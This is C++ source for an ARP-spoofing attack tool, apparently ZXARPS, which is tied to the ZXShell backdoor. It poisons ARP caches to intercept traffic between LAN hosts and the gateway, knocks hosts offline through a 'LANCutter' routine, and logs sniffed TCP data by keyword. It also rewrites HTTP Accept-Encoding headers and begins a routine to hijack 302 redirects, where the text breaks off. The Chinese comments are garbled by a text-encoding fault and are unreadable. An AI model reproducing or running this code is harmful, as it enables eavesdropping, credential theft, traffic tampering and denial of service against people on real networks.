//////////////////////////////////////////////////////////////////////
// CARPSpoof Class
//////////////////////////////////////////////////////////////////////

#include "ARPSpoof.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
namespace PCAPAPI
{

bool Inited = false;

_ZXpcap_perror        *pcap_perror;
_ZXpcap_sendpacket    *pcap_sendpacket;
_ZXpcap_next_ex       *pcap_next_ex;
_ZXpcap_freealldevs   *pcap_freealldevs;
_ZXpcap_close         *pcap_close;
_ZXpcap_breakloop     *pcap_breakloop;
_ZXpcap_open_live     *pcap_open_live;
_ZXpcap_findalldevs   *pcap_findalldevs;
_ZXpcap_dispatch      *pcap_dispatch;
_ZXpcap_loop          *pcap_loop;

#define _GetWinPcapAddr(a,b,c) \
	if(GetProcAddress(b, c) == NULL) {\
		printf("initializtion pcap api error: \"%\"s\r\n", c); return FALSE;\
	}else{\
	__asm mov a, eax\
	}

BOOL Init_pcapAPI()
{
	HINSTANCE hDll;

	if(!(hDll = ::LoadLibrary("wpcap.dll")))
		return FALSE;

	_GetWinPcapAddr(pcap_perror, hDll, "pcap_perror")
	_GetWinPcapAddr(pcap_sendpacket, hDll, "pcap_sendpacket")
	_GetWinPcapAddr(pcap_next_ex, hDll, "pcap_next_ex")
	_GetWinPcapAddr(pcap_freealldevs, hDll, "pcap_freealldevs")
	_GetWinPcapAddr(pcap_close, hDll, "pcap_close")
	_GetWinPcapAddr(pcap_breakloop, hDll, "pcap_breakloop")
	_GetWinPcapAddr(pcap_open_live, hDll, "pcap_open_live")
	_GetWinPcapAddr(pcap_findalldevs, hDll, "pcap_findalldevs")
	_GetWinPcapAddr(pcap_dispatch, hDll, "pcap_dispatch")
	_GetWinPcapAddr(pcap_loop, hDll, "pcap_loop")

	Inited = true;

	return TRUE;
}


}

#if !defined _ZXSHELL
////////////////////////////////////

/*
��Source�ַ�������ָ��char�ֶ�д�絽Dest�������С�
����ֵΪSource�е���һ���ε����ָ��
��:
Source = "1234  , 321, 43,333"
Dest���õ� "1234"
����ָ��ָ��" 321, 43,333"
*/
const char *TakeOutStringByChar(IN const char *Source, OUT char *Dest, int buflen, char ch, bool space)
{
	int i = 0;
	if(Source == NULL)
		return NULL;

	const char *p = strchr(Source, ch);

	if(space == false)
	{
		while(*Source == ' ')
			Source++;
	}
	for(i=0; i<buflen && *(Source+i) && *(Source+i) != ch; i++)
	{
		Dest[i] = *(Source+i);
	}
	if(i == 0)
		return NULL;
	else
		Dest[i] = '\0';

	const char *lpret = p ? p+1 : Source+i;

	if(space == false)
	{
		while(Dest[i-1] == ' ' && i>0)
			Dest[i---1] = '\0';
	}

	return lpret;
}

char *DNS(char *HostName)
{
	HOSTENT *hostent = NULL;
	IN_ADDR iaddr;
	hostent = gethostbyname(HostName);
	if (hostent == NULL)
	{
		return NULL;
	}
	iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
	return inet_ntoa(iaddr);
}

BOOL GetdwIP(char *startip, char *endip, DWORD *IP_start, DWORD *IP_end)
{
	DWORD dwIP;

	dwIP = inet_addr(startip);
	if(dwIP == INADDR_NONE)
		return FALSE;

	*IP_start = ntohl(dwIP);

	dwIP = inet_addr(endip);
	if(dwIP == INADDR_NONE)
		return FALSE;

	*IP_end = ntohl(dwIP);

	if(*IP_start <= *IP_end)
		return TRUE;
	else
		return FALSE;
}

#endif

//����Ч��ͺ������Ȱ�IP�ײ���Ч����ֶ���Ϊ0(IP_HEADER.checksum=0)
//Ȼ���������IP�ײ��Ķ����Ʒ���ĺ͡�
USHORT checksum(USHORT *buffer, int size)
{
       unsigned long cksum=0;
       while (size >1) {
              cksum+=*buffer++;
              size-=sizeof(USHORT);
       }
       if (size) cksum += *(UCHAR*) buffer;
       cksum = (cksum >> 16) + (cksum&0xffff);
       cksum += (cksum >> 16);
       return (USHORT) (~cksum); 
}

unsigned long cksum1(unsigned long cksum, USHORT *buffer, int size)
{
       while (size >1) {
              cksum+=*buffer++;
              size-=sizeof(USHORT);
       }
       if (size) cksum += *(UCHAR*) buffer;

       return (cksum); 
}

USHORT cksum2(unsigned long cksum)
{

       cksum = (cksum >> 16) + (cksum&0xffff);
       cksum += (cksum >> 16);
       return (USHORT) (~cksum); 
}

//
// ����tcp udp����͵ĺ���
// 
void _Checksum(IPHeader *pIphdr)
{
	
	PSD psd;
	unsigned long	_sum = 0;
	IPHeader  *ih;
	TCPHeader *th;
	UDPHEADER *uh;
	u_int ip_len=0, pro_len=0, data_len=0;
	unsigned char *data_offset;

	// �ҵ�IPͷ��λ�ú͵õ�IPͷ�ĳ���
	ih = pIphdr;
	ip_len = (ih->iphVerLen & 0xf) * sizeof(unsigned long);
	if(ih->ipProtocol == PROTO_TCP)
	{
		// �ҵ�TCP��λ��
		th = (TCPHeader *) ((u_char*)ih + ip_len);
		pro_len = ((th->dataoffset>>4)*sizeof(unsigned long));
		th->checksum = 0;
	}
	else if(ih->ipProtocol == PROTO_UDP)
	{
		// �ҵ�UDP��λ��
		uh = (UDPHEADER *) ((u_char*)ih + ip_len);
		pro_len = sizeof(UDPHEADER);
		uh->uh_sum = 0;
	}
	// ���ݳ���
	data_len = ntohs(ih->ipLength) - (ip_len + pro_len);
	// ����ƫ��ָ��
	data_offset = (unsigned char *)ih + ip_len + pro_len;

	// αͷ
	// ����ԴIP��ַ��Ŀ��IP��ַ
	psd.saddr = ih->ipSource;
	psd.daddr = ih->ipDestination;

	// ����8λ0��

	psd.mbz = 0;

	// Э��
	psd.ptcl = ih->ipProtocol;

	// ����
	psd.udpl = htons(pro_len + data_len);

	// ���뵽��һ��16λ�߽�
	for(int i=0; i < data_len % 2; i++)
	{
		data_offset[data_len] = 0;
		data_len++;
	}
	ih->ipChecksum = 0;
	ih->ipChecksum = checksum((USHORT*)ih, ip_len);
	_sum = cksum1(0, (USHORT*)&psd, sizeof(PSD));
	_sum = cksum1(_sum, (USHORT*)((u_char*)ih + ip_len), pro_len);
	_sum = cksum1(_sum, (USHORT*)data_offset, data_len);
	_sum = cksum2(_sum);

	// �������У��ͣ��������䵽Э��ͷ
	if(ih->ipProtocol == PROTO_TCP)
		th->checksum = _sum;
	else if(ih->ipProtocol == PROTO_UDP)
		uh->uh_sum = _sum;
	else 
		return;
}

CARPSpoof::CARPSpoof()
{
	init();

	WSAData wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);
}

CARPSpoof::~CARPSpoof()
{

	WSACleanup();


}

void CARPSpoof::init()
{
	runFlag = 0;
	exitFlag = 0;

	m_spoofdelay_ms = 30000;
	m_adhandle = NULL;
	hSpoofThread = NULL;
	m_spoofMode = SPOOF_A | SPOOF_B; //Ĭ��˫����ƭ
	ThreadFlag = false;
	bGetNetbiosName = false;
	b_SaveToFile = false;
	savemode = false;
	bHackHtml = false;
	bHackURL = false;
	m_fp = NULL;
	packetcount = 0;

	m_bandwidth = m_TotalData = 0;
	sc.Init();

	printfFlag = 0;

	m_rescan_Interval = 30000;
	m_restore_Interval = 0;
	m_cut_Interval = 0;
	m_cut_Mode = 0;

	memset(&m_Gateway, 0, sizeof(_HOSTINFO));
	memset(&m_Me, 0, sizeof(_HOSTINFO));
	memset(m_InsertCode, 0, 1024);
	memset(m_NewURL, 0, MAX_PATH);
	memset(m_NewFile, 0, MAX_PATH);

}

void CARPSpoof::destroy()
{
	if(m_fp)
	{
		fclose(m_fp);
		m_fp = NULL;
	}
	ClearFilter();
}

void CARPSpoof::ClearFilter()
{
	for(list<_LOGFILTER*>::iterator it = m_logfilter_List.begin(); it != m_logfilter_List.end(); it++)
	{
		_LOGFILTER *plf = *it;
		while(plf)
		{
			free(plf->keyword);
			plf = plf->next;
		}
		delete plf;
	}

	m_logfilter_List.clear();
}

int CARPSpoof::zxarps_printf(const char *fmt, ...)
{
	va_list args;
	int n;
	char TempBuf[8192];
	va_start(args, fmt);
	n = vsprintf(TempBuf, fmt, args);
	va_end(args);


#if defined _ZXSHELL
	return SendMessage(this->Socket, TempBuf);
#else
	return printf(TempBuf);
#endif
}

void CARPSpoof::SetInterval(int ms)
{
	m_spoofdelay_ms = ms;
}

bool CARPSpoof::SetLogFileName(char *FileName)
{
	if(m_fp)
	{
		//�����Ѿ���һ���ļ���,�رգ����´�ָ����
		fclose(m_fp);
	}
	strcpy(m_SaveToFile, FileName);
	m_fp = fopen(m_SaveToFile, "a+");
	if(m_fp == NULL)
		return false;
	else
		return true;
}

BOOL CARPSpoof::LogFilter(char *tcp_data, unsigned int tcp_len)
{
	int ret = FALSE;
	int _f = FALSE;

	for(list<_LOGFILTER*>::iterator it = m_logfilter_List.begin(); it != m_logfilter_List.end(); it++)
	{
		_LOGFILTER *plf = *it;
		ret = FALSE;
		_f = FALSE;
		while(plf)
		{
			if(plf->flag == 1)//û��ָ���Ĺؼ��ֲ���¼
			{
				if(!strstr(tcp_data, plf->keyword))
				{
					_f = TRUE;
					ret = FALSE;
					break;
				}
			}
			if(plf->flag == -1)//һ������ָ���Ĺؼ��ֲ���¼
			{
				if(strstr(tcp_data, plf->keyword))
				{
					_f = TRUE;
					ret = FALSE;
					break;
				}
			}
			if(plf->flag == 0)//��ͨ�ؼ���,ֻҪһ���ؼ��ִ��������������������¼
			{
				_f = TRUE;
				if(ret == FALSE)
					if(strstr(tcp_data, plf->keyword))
						ret = TRUE;
			}

			plf = plf->next;
		}
		if(_f ? ret : TRUE) return TRUE;
	}
	//���û����filter�򷵻�true
	return m_logfilter_List.size() == 0 ? TRUE : FALSE;
}

void CARPSpoof::SetFilter(char *str)
{
	const char *pNextRule = str, *pNextKeyword;
	_LOGFILTER *plf = NULL;
	char rule[MAX_PATH]="\0", keyword[MAX_PATH]="\0";
	int flag;

	ClearFilter();

	while(pNextRule = TakeOutStringByChar(pNextRule, rule, sizeof(rule), '|', true))
	{
		pNextKeyword = rule;
		plf = NULL;
		while(pNextKeyword = TakeOutStringByChar(pNextKeyword, keyword, sizeof(keyword), ',', true))
		{
			//ǰ׺+-_ָ���ؼ��ֵ�����
			if(keyword[0] == '+')//+��ʾ���ڹؼ��ֲż�¼
				flag = 1;
			else if(keyword[0] == '-')//ǰ׺-��ʾ���ڹؼ��ֲ���¼
				flag = -1;
			else if(keyword[0] == '_')//��ͨ�ؼ���
				flag = 0;
			else
				continue;
			if(plf == NULL)
			{
				plf = new _LOGFILTER;
				m_logfilter_List.push_back(plf);//ÿ�����������ͷ��ӵ� ��һ������
			}
			else
			{
				plf->next = new _LOGFILTER;
				plf = plf->next;
			}
			memset(plf, 0, sizeof(_LOGFILTER));
			plf->flag = flag;
			plf->keyword = strdup(keyword+1);

		}
		
	}
}

BOOL CARPSpoof::LogData(TCPHeader *th, IPHeader *ih, BYTE *pszData, int bytes)
{
	SYSTEMTIME	st;
	FILE		*stream = NULL;
	int			i, j;
	BYTE		*pszAscii = NULL;
	char		*pszHex = NULL;
	BOOL		bRet = FALSE;
	char tcp_data[1024*8];

	char buff[1024*8 + 4];

	GetLocalTime(&st);
	__try
	{
		if( (!bytes) || (!pszData) )
			__leave;

		memcpy(tcp_data, pszData, bytes);
		tcp_data[bytes] = '\0';
		//
		if(! LogFilter(tcp_data, bytes))
			__leave;
		//ת��Ϊ�ɼ��ַ�
		
		for(i=0;i<bytes;i++)
		{
			if( ((BYTE)tcp_data[i] < (BYTE)'\x20') || 
				((BYTE)tcp_data[i] > (BYTE)'\x7E') )
				tcp_data[i] = (BYTE)'.';
		}

		//ת��Ϊ16����

		for(i=0,j=0;i<bytes;i++)
		{
			j += sprintf(&buff[j], " %.2X", (BYTE)tcp_data[i]);
		}

		fprintf(m_fp, "\r\n#%s %.2d-%.2d-%.2d %.2d:%.2d:%.2d\r\n", 
			ih->ipProtocol == PROTO_UDP ? "UDP" : (ih->ipProtocol == PROTO_TCP ? "TCP" : "other"),
				st.wYear, st.wMonth, st.wDay,
				st.wHour, st.wMinute, st.wSecond
				);

		fprintf(m_fp, "%d.%d.%d.%d:%d -> ",
			ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
			ih->ipSourceByte.byte3, ih->ipSourceByte.byte4,
			ntohs(th->sourcePort)
			);

		fprintf(m_fp, "%d.%d.%d.%d:%d\r\n",
			ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
			ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4,
			ntohs(th->destinationPort)
			);

		//��¼���ļ�
		if(savemode)
		{
			for(i=0,j=0;i<bytes;i+=0x10,j+=0x30)
			{
				fprintf(m_fp, "%-48.48s    %-16.16s\r\n", 
					&buff[j], &tcp_data[i]);
			}
		}else
		{

			for(i=0;i<bytes;i++)
			{
				fprintf(m_fp, "%c", pszData[i]);
			}
			fprintf(m_fp, "\r\n");
		}
		fflush(m_fp);
		printf("�� %d �����ݰ�д�뵽�ļ�\r", ++packetcount);
	}//end of try
	__finally
	{
		return TRUE;
	}
	return TRUE;
}

void CARPSpoof::DoSpeedsCtrl(int len)
{
	if(m_bandwidth == 0)
		return;
	m_TotalData += len;

	sc.LimitSpeed(m_TotalData, len, m_bandwidth);

	return;
}

void CARPSpoof::SetSpoofMode(DWORD mode)
{
	m_spoofMode = 0;
	switch(mode)
	{
	case 1:
		m_spoofMode = SPOOF_A;
		break;
	case 2:
		m_spoofMode = SPOOF_B;
		break;
	case 3:
		m_spoofMode = SPOOF_A|SPOOF_B;
		break;
	}
}

void CARPSpoof::SetSpoolURL(char *szURL)
{
	strcpy(m_NewURL, szURL);
}

void CARPSpoof::SetPostfixURLFileName(char *szName)
{
	strcpy(m_NewFile, szName);
}

void CARPSpoof::EnableGetNetbiosName()
{
	bGetNetbiosName = true;
}

void CARPSpoof::KillSpoofThread()
{
	if(ThreadFlag == false)
		return;
	ThreadFlag = false;
	WaitForSingleObject(hSpoofThread, -1);

	CloseHandle(hSpoofThread);

}

int CARPSpoof::AddRule_PostFix(char *strPostfix)
{
	const char *pNextName = strPostfix;
	_POSTFIX pf;

	m_postfixname_List.clear();

	while(pNextName = TakeOutStringByChar(pNextName, pf.name, 15, ',', false))
	{
		m_postfixname_List.push_back(pf);
	}

	return m_postfixname_List.size();
}

bool CARPSpoof::IsPostfixInList(char *pf)
{
	for(list<_POSTFIX>::iterator it = m_postfixname_List.begin(); it != m_postfixname_List.end(); it++)
	{
		if(!strnicmp(pf, it->name, strlen(it->name)))
			return true;
	}
	return false;
}

int CARPSpoof::AddRuleToCut(char *strMAC)
{
	const char *pNextRule = strMAC;
	char mac[20] = {0xff};

	m_cutmac_List.clear();

	while(pNextRule = TakeOutStringByChar(pNextRule, mac, 18, ',', false))
	{
		m_cutmac_List.push_back(strdup(mac));//free()??not implemented
	}

	return m_cutmac_List.size();
}

bool CARPSpoof::IsBlackMAC(BYTE *pmac)
{
	char mac[20];
	int len;

	//ûָ��������mac��ȫ������������
	if(m_cutmac_List.size() == 0)
		return true;

	for(list<char*>::iterator it = m_cutmac_List.begin(); it != m_cutmac_List.end(); it++)
	{
		len = _snprintf(mac, 18, "%.2x-%.2x-%.2x-%.2x-%.2x-%.2x", pmac[0],pmac[1],pmac[2],pmac[3],pmac[4],pmac[5]);
		if(!strnicmp(mac, *it, len))
			return true;
	}
	return false;
}


void CARPSpoof::LANCutter()
{
	u_char ucFrame_toGateway[ARP_LEN];

	u_char ucFrame_toTarget[ARP_LEN];

	//Ethernetͷ
	ETHeader eh = { 0 };

	eh.type = htons(ETHERTYPE_ARP);

	//Arpͷ
	ARPHeader ah = { 0 };
	ah.hrd = htons(ARPHRD_ETHER);
	ah.eth_type = htons(ETHERTYPE_IP);
	ah.maclen = 6;
	ah.iplen = 4;
	ah.opcode = htons(ARP_REPLY);

	// Loop send RARP Packet 

	list<_HOSTINFO>::iterator it;

	BYTE bmac[6];

	while(1)
	{
		srand( (unsigned)time( NULL ) );

		if(GetSpoofMode() & SPOOF_A)
		{
			for(it = m_host_List.begin(); it != m_host_List.end(); it++)
			{
				if(it->bLiving == false)
					continue;

				if(IsBlackMAC(it->s_mac.mac) == false)
					continue;

				//Ethernetͷ
				memcpy(eh.dhost, m_Gateway.s_mac.mac, 6);//��������
				//memcpy(eh.shost, m_Me.s_mac.mac, 6);//�������Ǳ���

				if(m_cut_Mode == 0)
				{

					eh.shost[0] = rand()%0xff;
					eh.shost[1] = rand()%0xff;
					eh.shost[2] = rand()%0xff;
					eh.shost[3] = rand()%0xff;
					eh.shost[4] = rand()%0xff;
					eh.shost[5] = rand()%0xff;

				}else// if(m_cut_Mode == 1)
				{
					memcpy(eh.shost, m_Gateway.s_mac.mac, 6);
				}

				ah.saddr = it->dwIP;  //�û�IP����Ҫ��ƭ��ip
				
				//���������Чmac
				ah.smac[0] = rand()%0xff;
				ah.smac[1] = rand()%0xff;
				ah.smac[2] = rand()%0xff;
				ah.smac[3] = rand()%0xff;
				ah.smac[4] = rand()%0xff;
				ah.smac[5] = rand()%0xff;

				ah.daddr = m_Gateway.dwIP;   //Ŀ��������
				memcpy(ah.dmac, m_Gateway.s_mac.mac, 6);

				//������
				memcpy(ucFrame_toGateway, &eh, sizeof(eh));
				memcpy(ucFrame_toGateway+sizeof(ETHeader), &ah, sizeof(ah));

				if(PCAPAPI::pcap_sendpacket(m_adhandle, (const unsigned char *) ucFrame_toGateway, ARP_LEN) < 0)
					it->bLiving = false;

			}
		}

		if(GetSpoofMode() & SPOOF_B)
		{
			for(it = m_host_List.begin(); it != m_host_List.end(); it++)
			{
				if(it->bLiving == false)
					continue;

				if(IsBlackMAC(it->s_mac.mac) == false)
					continue;

				//Ethernetͷ
				memcpy(eh.dhost, it->s_mac.mac, 6);//����Ŀ���
				//memcpy(eh.shost, m_Me.s_mac.mac, 6);//�������Ǳ���

				if(m_cut_Mode == 0)
				{

					eh.shost[0] = rand()%0xff;
					eh.shost[1] = rand()%0xff;
					eh.shost[2] = rand()%0xff;
					eh.shost[3] = rand()%0xff;
					eh.shost[4] = rand()%0xff;
					eh.shost[5] = rand()%0xff;

				}else// if(m_cut_Mode == 1)
				{
					memcpy(eh.shost, m_Gateway.s_mac.mac, 6);
				}
				//Arpͷ
				ah.saddr = m_Gateway.dwIP;  //���ص�IP

				//���������Чmac
				ah.smac[0] = rand()%0xff;
				ah.smac[1] = rand()%0xff;
				ah.smac[2] = rand()%0xff;
				ah.smac[3] = rand()%0xff;
				ah.smac[4] = rand()%0xff;
				ah.smac[5] = rand()%0xff;

				ah.daddr = it->dwIP;
				memcpy(ah.dmac, it->s_mac.mac, 6);
				
				//������
				memcpy(ucFrame_toTarget, &eh, sizeof(eh));
				memcpy(ucFrame_toTarget+sizeof(ETHeader), &ah, sizeof(ah));

				if(PCAPAPI::pcap_sendpacket(m_adhandle, (const unsigned char *) ucFrame_toTarget, ARP_LEN) < 0)
					it->bLiving = false;
			}
		}

		if(m_cut_Interval == 0)
			break;
		else
			Sleep(m_cut_Interval);
	}

}


void CARPSpoof::RestoreARPTable()
{
	u_char ucFrame_toGateway[ARP_LEN];

	u_char ucFrame_toTarget[ARP_LEN];

	//Ethernetͷ
	ETHeader eh = { 0 };

	eh.type = htons(ETHERTYPE_ARP);

	//Arpͷ
	ARPHeader ah = { 0 };
	ah.hrd = htons(ARPHRD_ETHER);
	ah.eth_type = htons(ETHERTYPE_IP);
	ah.maclen = 6;
	ah.iplen = 4;
	ah.opcode = htons(ARP_REPLY);

	// Loop send RARP Packet 

	list<_HOSTINFO>::iterator it;

	while(1)
	{
		srand( (unsigned)time( NULL ) );

		if(GetSpoofMode() & SPOOF_A)
		{
			//�޸���2007.06.28
			//for(it = m_host_List.begin(); it != m_host_List.end(); )
			for(it = m_host_List.begin(); it != m_host_List.end(); it++)
			{
				if(it->bLiving == false)
					continue;
				//Ethernetͷ
				memcpy(eh.dhost, m_Gateway.s_mac.mac, 6);//��������
				//memcpy(eh.shost, m_Me.s_mac.mac, 6);//�������Ǳ���
				memcpy(eh.shost, it->s_mac.mac, 6);//������


				memcpy(ah.smac, it->s_mac.mac, 6); //mac�Ǵ��ָ���Ŀ���
				ah.saddr = it->dwIP;  //mac��Ӧ��ip
				memcpy(ah.dmac, m_Gateway.s_mac.mac, 6);
				ah.daddr = m_Gateway.dwIP;   //Ŀ��mac������

				//������
				memcpy(ucFrame_toGateway, &eh, sizeof(eh));
				memcpy(ucFrame_toGateway+sizeof(ETHeader), &ah, sizeof(ah));
		/*
				if(PCAPAPI::pcap_sendpacket(m_adhandle, (const unsigned char *) ucFrame_toGateway, ARP_LEN) < 0)
					m_host_List.erase(it++);
				else
				{
					//StaticARP(it->szIP, it->s_mac.mac);
					it++;
				}
		*/
				if(PCAPAPI::pcap_sendpacket(m_adhandle, (const unsigned char *) ucFrame_toGateway, ARP_LEN) < 0)
					it->bLiving = false;

			}
		}

		if(GetSpoofMode() & SPOOF_B)
		{
			//for(it = m_host_List.begin(); it != m_host_List.end();)
			for(it = m_host_List.begin(); it != m_host_List.end(); it++)
			{
				if(it->bLiving == false)
					continue;
				//Ethernetͷ
				memcpy(eh.dhost, it->s_mac.mac, 6);//����Ŀ���
				//memcpy(eh.shost, m_Me.s_mac.mac, 6);//�������Ǳ���
				memcpy(eh.shost, m_Gateway.s_mac.mac, 6);//������


				//Arpͷ
				memcpy(ah.smac, m_Gateway.s_mac.mac, 6); //mac������
				ah.saddr = m_Gateway.dwIP;  //���ص�mac
				memcpy(ah.dmac, it->s_mac.mac, 6);
				ah.daddr = it->dwIP;
				
				//������
				memcpy(ucFrame_toTarget, &eh, sizeof(eh));
				memcpy(ucFrame_toTarget+sizeof(ETHeader), &ah, sizeof(ah));
		/*
				if(PCAPAPI::pcap_sendpacket(m_adhandle, (const unsigned char *) ucFrame_toTarget, ARP_LEN) < 0)
					m_host_List.erase(it++);
				else
				{
					it++;
				}
		*/
				if(PCAPAPI::pcap_sendpacket(m_adhandle, (const unsigned char *) ucFrame_toTarget, ARP_LEN) < 0)
					it->bLiving = false;
			}
		}

		if(m_restore_Interval == 0)
			break;
		else
			Sleep(m_restore_Interval);
	}

}

BYTE *CARPSpoof::dwIP2MAC(DWORD dwIP)
{
	if(dwIP != 0)
	{
		for(list<_HOSTINFO>::iterator it = m_host_List.begin(); it != m_host_List.end();it++)
		{
			if(it->dwIP == dwIP)
				return it->s_mac.mac;
		}
	}
	return NULL;
}

DWORD WINAPI CARPSpoof::RescanThread(LPVOID lParam)
{
	CARPSpoof *lpObj = (CARPSpoof *)lParam;

	DWORD rescanTimer = GetTickCount();

	while(lpObj->exitFlag == FALSE)
	{
		//����ɨ����������
		if(GetTickCount() - rescanTimer > lpObj->m_rescan_Interval)
		{
			rescanTimer = GetTickCount();
			lpObj->GetHostInfo();
			if(lpObj->printfFlag)
				lpObj->GetAliveHostList();
		}else
		{
			Sleep(5);
		}
	}
	return 0;
}

BOOL CARPSpoof::StartupRescanThread()
{
	DWORD dwTid;
	HANDLE hThread;

	hThread = CreateThread(0, 0, RescanThread, this, 0, &dwTid);

	if(hThread == NULL)
		return FALSE;

	CloseHandle(hThread);

	return TRUE;

}

DWORD WINAPI CARPSpoof::DoSpoof(LPVOID lParam)
{

	CARPSpoof *lpObj = (CARPSpoof *)lParam;

	lpObj->ThreadFlag = true;
	lpObj->runFlag = 1;

	u_char ucFrame_toGateway[ARP_LEN];

	u_char ucFrame_toTarget[ARP_LEN];

	//Ethernetͷ
	ETHeader eh = { 0 };

	eh.type = htons(ETHERTYPE_ARP);

	//Arpͷ
	ARPHeader ah = { 0 };
	ah.hrd = htons(ARPHRD_ETHER);
	ah.eth_type = htons(ETHERTYPE_IP);
	ah.maclen = 6;
	ah.iplen = 4;
	ah.opcode = htons(ARP_REPLY);

	if(lpObj->m_spoofdelay_ms == 0)
		lpObj->m_spoofdelay_ms = 30000;

	DWORD time = GetTickCount();

	// Loop send RARP Packet 
	while(lpObj->m_host_List.size()>0)
	{
		list<_HOSTINFO>::iterator it;

		if(lpObj->GetSpoofMode() & SPOOF_A)
		{
			//��ƭ���ذѵ�Ŀ��host�����ݷ���������
			//for(it = lpObj->m_host_List.begin(); it != lpObj->m_host_List.end()&&lpObj->ThreadFlag; )
			for(it = lpObj->m_host_List.begin(); it != lpObj->m_host_List.end()&&lpObj->ThreadFlag; it++)//�޸���2007.06.28
			{
				if(it->bLiving == false)
					continue;
				//Ethernetͷ
				memcpy(eh.dhost, lpObj->m_Gateway.s_mac.mac, 6);//��������
				memcpy(eh.shost, lpObj->m_Me.s_mac.mac, 6);//�������Ǳ���
				//Arpͷ
				memcpy(ah.smac, lpObj->m_Me.s_mac.mac, 6); //mac�Ǳ�����mac����ƭ��
				ah.saddr = it->dwIP;  //Ҫ��ƭ��ip��Ŀ��
				memcpy(ah.dmac, lpObj->m_Gateway.s_mac.mac, 6);
				ah.daddr = lpObj->m_Gateway.dwIP;   //Ŀ��mac������

				//������
				memcpy(ucFrame_toGateway, &eh, sizeof(eh));
				memcpy(ucFrame_toGateway+sizeof(ETHeader), &ah, sizeof(ah));

				//�޸���2007.06.28
/*
				if(PCAPAPI::pcap_sendpacket(lpObj->m_adhandle, (const unsigned char *) ucFrame_toGateway, ARP_LEN) < 0)
					lpObj->m_host_List.erase(it++);
				else
				{
					//lpObj->StaticARP(it->szIP, it->s_mac.mac);
					it++;
				}
*/
				//�޸�Ϊ
				//����ʧ�����־�����������
				if(PCAPAPI::pcap_sendpacket(lpObj->m_adhandle, (const unsigned char *) ucFrame_toGateway, ARP_LEN) < 0)
					it->bLiving = false;

			}
		}

		if(lpObj->GetSpoofMode() & SPOOF_B)
		{
			//��ƭĿ�������ѷ������ص����ݷ���������
			//for(it = lpObj->m_host_List.begin(); it != lpObj->m_host_List.end()&&lpObj->ThreadFlag;)
			for(it = lpObj->m_host_List.begin(); it != lpObj->m_host_List.end()&&lpObj->ThreadFlag; it++)
			{
				if(it->bLiving == false)
					continue;
				if(it->dwIP == lpObj->m_Me.dwIP)//���Լ���ƭ�Լ�
					continue;
				//Ethernetͷ
				memcpy(eh.dhost, it->s_mac.mac, 6);//����Ŀ���
				memcpy(eh.shost, lpObj->m_Me.s_mac.mac, 6);//�������Ǳ���
				//Arpͷ
				memcpy(ah.smac, lpObj->m_Me.s_mac.mac, 6); //mac�Ǳ�����mac����ƭĿ��������ص�
				ah.saddr = lpObj->m_Gateway.dwIP;  //���ص�ip��
				memcpy(ah.dmac, it->s_mac.mac, 6);
				ah.daddr = it->dwIP;

				//������
				memcpy(ucFrame_toTarget, &eh, sizeof(eh));
				memcpy(ucFrame_toTarget+sizeof(ETHeader), &ah, sizeof(ah));
/*
				if(PCAPAPI::pcap_sendpacket(lpObj->m_adhandle, (const unsigned char *) ucFrame_toTarget, ARP_LEN) < 0)
					lpObj->m_host_List.erase(it++);
				else
				{
					it++;
				}
*/

				if(PCAPAPI::pcap_sendpacket(lpObj->m_adhandle, (const unsigned char *) ucFrame_toTarget, ARP_LEN) < 0)
					it->bLiving = false;

			}
			//lpObj->StaticARP(lpObj->m_Gateway.szIP, lpObj->m_Gateway.s_mac.mac);
		}

		while(1)
		{
			if(lpObj->ThreadFlag == false)
				goto _EXIT;

			if(GetTickCount() - time < lpObj->m_spoofdelay_ms)
			{
				Sleep(1); // Sleep x sec to restore arp cache
				continue;
			}else
			{
				time = GetTickCount();
				break;
			}
		}


	}

_EXIT:
	return 0;	
}

BOOL GetHttpHeaderData(char *HeaderBuf, int orglen, char *Header, char *RetData)
{
	char *pTitle;
	pTitle = strstr(HeaderBuf, Header);
	if(pTitle == NULL)
		return false;
	return sscanf(pTitle+strlen(Header), "%s", RetData);
}

bool ModifyHttpHeaderByTitle(char *HeaderBuf, int orglen, char *Header, char *NewData, int *newlen)
{
	//char tmpBuf[8*1024];
	char *CRLF = "\r\r\n";
	char *ps, *pe;
	int DataLen, NewDataLen, BackupLen;
	int len = orglen;
	pe = strstr(HeaderBuf, CRLF);
	if(pe == NULL)
	{
		CRLF++;
		pe = strstr(HeaderBuf, CRLF);
		if(pe == NULL)
		{
			CRLF++;
			pe = strstr(HeaderBuf, CRLF);
			if(pe == NULL)
				return false;
		}
	}

	NewDataLen = lstrlen(NewData);
	ps = strstr(HeaderBuf, Header);
	if(ps == NULL)
		return false;
	ps += lstrlen(Header);
	pe = strstr(ps, CRLF);
	if(pe == NULL)
		return false;
	DataLen = pe - ps;
	BackupLen = len-(pe-HeaderBuf);
	memcpy(ps+NewDataLen, pe, BackupLen);
	memcpy(ps, NewData, NewDataLen);
	//strncpy(ps+NewDataLen, tmpBuf, BackupLen);
	*newlen =  orglen + (NewDataLen - DataLen);
	return true;
}

/*
  GET /.../ HTTP/1.x
  Accept-Charset: US-ASCII
  Accept-Encoding: none

  ֻ�޸�������ҳ����
*/
bool SetAcceptEncoding(u_char *tcp_data, unsigned int tcp_len, int *newlen)
{
	if(strnicmp((char*)tcp_data, "GET /", 5))
		return false;

	char *p = strstr((char*)tcp_data, "\r\n");
	if(!p)
		return false;
	if(strnicmp(p-10, "/ HTTP/1.", 9))
		return false;

	//if(!ModifyHttpHeaderByTitle((char*)tcp_data, tcp_len, "Accept-Encoding: ", "none", newlen))
	//	return false;

	char *ps = strstr((char*)tcp_data, "Accept-Encoding: ");
	if(!ps)
		return false;
	ps += strlen("Accept-Encoding: ");
	char *pe = strstr(ps, "\r\n");
	if(!pe)
		return false;
	memset(ps, ' ', pe-ps);
	memcpy(ps, "none", 4);

	return true;
}


bool CARPSpoof::HackURL(CARPSpoof *lpObj, u_char *tcp_data, unsigned int tcp_len, int *newlen)
{
	char OrgFile[MAX_PATH] = "\0";
	char postname[15] = {0};
	//Hack URL start
	if(lpObj->bHackURLEnabled() == false)//������
		return false;
	if(strnicmp((const char*)tcp_data, "HTTP/1.1 302", 12) &&
	   strnicmp((const char*)tcp_data, "HTTP/1.0 302", 12))
		return false;
